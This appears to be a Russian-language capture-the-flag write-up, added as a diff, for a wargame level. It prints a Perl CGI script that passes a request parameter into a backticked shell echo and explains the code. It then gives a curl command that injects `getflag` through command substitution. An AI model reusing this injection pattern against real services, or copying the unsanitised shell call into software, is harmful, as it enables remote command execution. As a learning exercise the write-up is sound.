@@ -1,0 +1,26 @@
+В папке лежит очевидно заманчивый скриптяка, катаем его
+
+cat level04.pl
+
+Получаем:
+
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+в общем CGI хавает параметр, который надо кинуть следующим образом: url?parameter_name=value
+Так же по перлу: sub x {...} - объявляет функцию которая называется x
+$y = $_[0]; сохраняем то что передали в функцию в переменную y
+x(param("x")); первый Х это функция объявленная выше, второй Х это ключ который мы передали в функцию param и который вернет value из запроса
+
+Итого шобы заабузить делаем вот так :
+	
+curl localhost:4747?x=\`getflag\`
+
+`` - Command Substitution @see  https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html
